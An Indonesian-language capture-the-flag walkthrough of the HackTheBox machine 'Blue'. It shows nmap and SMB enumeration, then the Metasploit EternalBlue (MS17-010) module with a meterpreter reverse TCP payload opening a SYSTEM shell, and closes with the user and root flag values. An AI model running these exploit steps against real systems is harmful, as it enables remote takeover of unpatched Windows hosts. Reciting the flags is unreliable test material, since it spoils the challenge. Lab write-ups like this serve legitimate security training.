---
title: "HackTheBox Blue Walkthrough"
description: 'Blue is an easy Windows machine on HackTheBox that involves exploiting the well-known MS17-010 vulnerability in the SMB protocol to gain Remote Code Execution (RCE) and ultimately retrieve user and root flags. This walkthrough covers reconnaissance, exploitation using Metasploit, and post-exploitation steps.'
date: 2025-10-16
tags: ["SMB","MS17-010"]
image: '/public/static/htb-cover.jpg'
authors: ['chjwoo']
---
## Reconnaissance

Hal yang harus dilakukan pertama kali, kita harus melakukan enumeration running services menggunakan nmap

```bash
┌──(chjwoo㉿hackbox)-[~/hackthebox/machines/blue]
└─$ sudo nmap -sVC -Pn -p- 10.129.58.209 --min-rate=1000 -T4 -oA nmap_results
[sudo] password for chjwoo: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-16 02:24 WIB
Warning: 10.129.58.209 giving up on port because retransmission cap hit (6).
Stats: 0:02:17 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 98.41% done; ETC: 02:26 (0:00:00 remaining)
Nmap scan report for 10.129.58.209
Host is up (0.021s latency).
Not shown: 65245 closed tcp ports (reset), 281 filtered tcp ports (no-response)
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -19m57s, deviation: 34m37s, median: 1s
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: haris-PC
|   NetBIOS computer name: HARIS-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-10-15T20:26:45+01:00
| smb2-time: 
|   date: 2025-10-15T19:26:48
|_  start_date: 2025-10-15T19:23:32
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 141.02 seconds

```

### Analyzing scan result

- Port 135, pada port ini berjalan service msrpc (Microsoft Remote Procedure Call), yang berfungsi untuk komunikasi antar client-server yang memungkinkan sebuah program untuk request services dari program komputer lainnya.
- Port 139, pada port ini berjalan service netbios-ssn yang berfungsi sebagai API dan session layer untuk aplikasi berkomunikasi antar komputer dalam 1 jaringan.
- Port 445, pada port ini berjalan service microsoft-ds (Directory Service) yang berfungsi untuk sharing files dalam sistem operasi Windows.
- Jadi terdapat smb service yang sedang berjalan pada box tersebut. yang berjalan pada port 445 dan 139

### Enumeration SMB directory

```bash
┌──(chjwoo㉿hackbox)-[~/hackthebox/machines/blue]
└─$ smbclient -N -L //10.129.58.209            

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        Share           Disk      
        Users           Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.58.209 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

```

Terdapat 5 shares folder, yang hanya bisa dilihat dengan account guest hanya Share dan Users, namun tidak terdapat file yang bisa kita exploit.

Namun terdapat kerentanan MS17-010 SMB Remote RCE

[https://success.trendmicro.com/en-US/solution/KA-0008859#:~:text=Summary,remote code execution (RCE)](https://success.trendmicro.com/en-US/solution/KA-0008859#:~:text=Summary,remote%20code%20execution%20(RCE)).

## Foothold

Kita bisa langsung saja menggunakan Metasploit Framework 

```bash
msf > search smb eternalblue

Matching Modules
================

   #   Name                                           Disclosure Date  Rank     Check  Description
   -   ----                                           ---------------  ----     -----  -----------
   0   exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
msf > use 0
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), see https://docs.metasploi
                                             t.com/docs/using-metasploit/basics/using-metas
                                             ploit.html
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authe
                                             ntication. Only affects Windows Server 2008 R2
                                             , Windows 7, Windows Embedded Standard 7 targe
                                             t machines.
   SMBPass                         no        (Optional) The password for the specified user
                                             name
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit T
                                             arget. Only affects Windows Server 2008 R2, Wi
                                             ndows 7, Windows Embedded Standard 7 target ma
                                             chines.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Onl
                                             y affects Windows Server 2008 R2, Windows 7, W
                                             indows Embedded Standard 7 target machines.

Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process,
                                         none)
   LHOST     192.168.198.129  yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Automatic Target

View the full module info with the info, or info -d command.
msf exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.129.58.209
RHOSTS => 10.129.58.209
msf exploit(windows/smb/ms17_010_eternalblue) > set LHOST 10.10.14.108
LHOST => 10.10.14.108
msf exploit(windows/smb/ms17_010_eternalblue) > exploit
[*] Started reverse TCP handler on 10.10.14.108:4444 
[*] 10.129.58.209:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.129.58.209:445     - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/recog-3.1.21/lib/recog/fingerprint/regexp_factory.rb:34: warning: nested repeat operator '+' and '?' was replaced with '*' in regular expression
[*] 10.129.58.209:445     - Scanned 1 of 1 hosts (100% complete)
[+] 10.129.58.209:445 - The target is vulnerable.
[*] 10.129.58.209:445 - Connecting to target for exploitation.
[+] 10.129.58.209:445 - Connection established for exploitation.
[+] 10.129.58.209:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.129.58.209:445 - CORE raw buffer dump (42 bytes)
[*] 10.129.58.209:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.129.58.209:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.129.58.209:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.129.58.209:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.129.58.209:445 - Trying exploit with 12 Groom Allocations.
[*] 10.129.58.209:445 - Sending all but last fragment of exploit packet
[*] 10.129.58.209:445 - Starting non-paged pool grooming
[+] 10.129.58.209:445 - Sending SMBv2 buffers
[+] 10.129.58.209:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.129.58.209:445 - Sending final SMBv2 buffers.
[*] 10.129.58.209:445 - Sending last fragment of exploit packet!
[*] 10.129.58.209:445 - Receiving response from exploit packet
[+] 10.129.58.209:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.129.58.209:445 - Sending egg to corrupted connection.
[*] 10.129.58.209:445 - Triggering free of corrupted buffer.
[*] Sending stage (203846 bytes) to 10.129.58.209
[*] Meterpreter session 1 opened (10.10.14.108:4444 -> 10.129.58.209:49158) at 2025-10-16 02:58:04 +0700
[+] 10.129.58.209:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.129.58.209:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.129.58.209:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

meterpreter > id

```

Kita telah berhasil mendapatkan shell sebagai

```bash
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

```

Kita telah mendapatkan user flag dan root flag

```bash
C:\Users\haris\Desktop>type user.txt
type user.txt
34973aa1cb878cc00309ed8fe4219ba3
C:\Users\haris\Desktop>cd C:\Users\Administrator\Desktop 
cd C:\Users\Administrator\Desktop

C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is BE92-053B

 Directory of C:\Users\Administrator\Desktop

24/12/2017  03:22    <DIR>          .
24/12/2017  03:22    <DIR>          ..
15/10/2025  20:24                34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)   2,693,640,192 bytes free

C:\Users\Administrator\Desktop>type root.txt
type root.txt
1f84fd4209de36769449147255c3ca37
```

## Flags

```bash
User's Flag: 34973aa1cb878cc00309ed8fe4219ba3
Root's Flag: 1f84fd4209de36769449147255c3ca37
```